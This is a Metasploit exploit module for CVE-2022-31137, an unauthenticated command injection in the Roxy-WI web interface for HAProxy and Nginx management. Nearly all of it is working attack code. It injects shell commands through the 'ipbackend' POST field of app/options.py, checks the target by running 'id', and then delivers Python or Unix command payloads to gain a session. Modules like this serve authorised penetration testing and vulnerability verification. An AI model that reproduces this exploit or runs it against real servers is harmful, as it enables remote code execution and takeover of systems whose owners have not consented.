##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Roxy-WI Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits command injection vulnerability to achieve remote code execution.
          Unauthenticated users can execute a terminal command under the context of the web server user.

          Roxy-WI is an interface for managing HAProxy, Nginx and Keepalived servers. In versions 6.1.1.0 and earlier,
          an unauthenticated user can execute some methods of administrator functions without needing any credentials.
          Due to the nature of the vulnerability, an adversary can change some part of the webpage, or hijack an administrator account,
          existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes,
          or execute operating system command under the context of the web-server user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Nuri Ã‡ilengir <nuri@prodaft.com>' # Author & Metasploit module
        ],
        'References' => [
          ['URL', 'https://pentest.blog/advisory-roxywi-unauthenticated-remote-code-execution-cve-2022-3113/'], # Advisory
          ['URL', 'https://github.com/hap-wi/roxy-wi/security/advisories/GHSA-53r2-mq99-f532'], # Additional Information
          ['URL', 'https://github.com/hap-wi/roxy-wi/commit/82666df1e60c45dd6aa533b01a392f015d32f755'], # Patch
          ['CVE', '2022-31137']
        ],
        'DefaultOptions' => {
          'SSL' => true,
          'WfsDelay' => 25
        },
        'Privileged' => false,
        'Platform' => ['python', 'unix'],
        'Arch' => [ARCH_PYTHON, ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => '2022-07-06',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])
      ]
    )
  end

  def execute_command(cmd, _opts = {})
    return send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'app', 'options.py'),
        'vars_post' => {
          'serv' => '127.0.0.1',
          'ipbackend' => "poc\"; #{cmd} ;#",
          'alert_consumer' => Rex::Text.rand_text_alpha_lower(7),
          'backend_server' => '127.0.0.1'
        }
      }, 10
    )
  rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Errno::ETIMEDOUT
    fail_with(Failure::Unknown, "#{peer} - Something went wrong!")
  end

  def check
    print_status "Checking if #{peer} is vulnerable!"

    res = execute_command("id")
        
    return CheckCode::Unknown("Didn't receive a response from the target.") unless res
    return CheckCode::Safe("Check URI Path, unexpected HTTP response code: #{res.code}.") unless res.code == 200

    if res && res.body =~ /uid=\d+\(.+\)/
      return CheckCode::Vulnerable('The device responded to exploitation with a 200 OK and test command successfully executed.')
    end

    CheckCode::Safe('The target did not respond with an expected payload.')
  end

  def exploit
    print_status 'Generating payload.'
    print_status 'Trying to detect command injection vulnerability.'

    begin
      if target['Arch'] == ARCH_PYTHON
        execute_command("python3 -c \"#{payload.encoded}\"")
      else
        execute_command(payload.encoded)
      end
    rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Errno::ETIMEDOUT
      fail_with(Failure::Unknown, 'Something went wrong!')
    else
      print_good('Exploit successfully executed.')
    end
  end
end
